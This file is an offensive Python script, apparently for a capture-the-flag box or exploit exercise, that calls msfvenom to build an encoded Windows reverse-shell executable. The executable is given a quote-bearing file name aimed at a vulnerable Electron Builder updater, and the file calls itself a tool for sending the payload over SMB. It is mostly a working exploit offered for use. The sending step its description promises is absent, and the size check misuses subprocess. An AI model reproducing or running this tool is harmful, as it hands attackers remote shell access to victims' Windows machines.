import netifaces as ni
import subprocess
import sys
import argparse
import os
from pathlib import Path

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("IP Address on interface " + interface + ": " + ip)
    
    return ip

def gen_payload(ip, port, payload, dir):
    """generate an msfvenom payload with given IP address and port"""

    cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -e x86/shikata_ga_nai -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'

    print("Running command: " + cmd_str)
    
    subprocess.call(cmd_str, shell=True)

def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    #positional arguments
    parser.add_argument("ip", help="Target IP address")

    #named parameters/flags
    parser.add_argument("--payload", help="Meterpreter payload to use. Default is windows/x64/shell_reverse_tcp")
    parser.add_argument("--lip", help="Local IP to listen on. Specify either this or --lint")
    parser.add_argument("--lint", help="Local interface to listen on. Specify either this or --lip")
    parser.add_argument("--lport", help="Local port to listen on. 9001 by default")
    parser.add_argument("--dir", help="Directory to save payload and stand up server in")

    #parse arguments
    args = parser.parse_args()

    #default values
    path = ""
    port = "9001"
    payload = "windows/shell_reverse_tcp"

    #get IP, taking --lip as priority over --lint if both provided
    if args.lip is not None:
        ip = args.lip
        print("IP Address: " + ip)
    elif args.lint is not None:
        ip = get_ip(args.lint)
    else:
        print("You must provide one of --lip or --lint")
        sys.exit(1)

    #get port
    arg_port = args.lport
    if arg_port is not None:
        port = arg_port

    #mkdir if doesn't exist
    arg_path = args.dir
    if arg_path is not None:
        path = arg_path + "/"
        dirpath = Path(arg_path)

        if not dirpath.is_dir():
            print("Directory not found - creating directory")
            dirpath.mkdir()

    #get payload
    arg_payload = args.payload
    if arg_payload is not None:
        payload = arg_payload

    #generate shell payload
    gen_payload(ip, port, payload, path)

    payload_path = path + "heedv1'Setup1.0.1.exe"
    print("Payload saved at: " + payload_path)
    
    #get size of payload
    size = subprocess.call('stat -c%s "' + payload_path + '"')
    print("Size: " + str(size))

if __name__ == '__main__':
    main()